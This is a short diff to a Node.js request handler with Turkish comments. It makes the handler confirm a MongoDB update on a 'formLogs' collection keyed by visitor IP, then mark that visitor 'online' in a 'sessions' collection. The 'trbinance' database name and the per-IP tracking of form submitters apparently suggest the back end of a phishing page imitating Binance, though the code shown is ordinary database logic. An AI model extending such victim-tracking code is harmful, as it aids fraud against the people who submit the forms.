@@ -65,14 +65,30 @@ module.exports = async (req, res) => {
     const client = await clientPromise;
     const db = client.db(process.env.MONGODB_DB || 'trbinance');
     const logs = db.collection('formLogs');
+    const sessions = db.collection('sessions');
 
-    await logs.updateOne(
+    // MongoDB'ye kaydın başarıyla yapıldığından emin ol
+    const result = await logs.updateOne(
       { ip },
       {
         $set: setFields
       },
       { upsert: false }
     );
+
+    // Response dönen kullanıcıyı sessions'a da ekle (online yap)
+    if (result.acknowledged && result.matchedCount > 0) {
+      await sessions.updateOne(
+        { ip },
+        {
+          $set: {
+            ip,
+            lastSeen: now
+          }
+        },
+        { upsert: true }
+      ).catch(err => console.error('Session update failed', err));
+    }
 
     return res.status(200).json({ ok: true });
   } catch (err) {
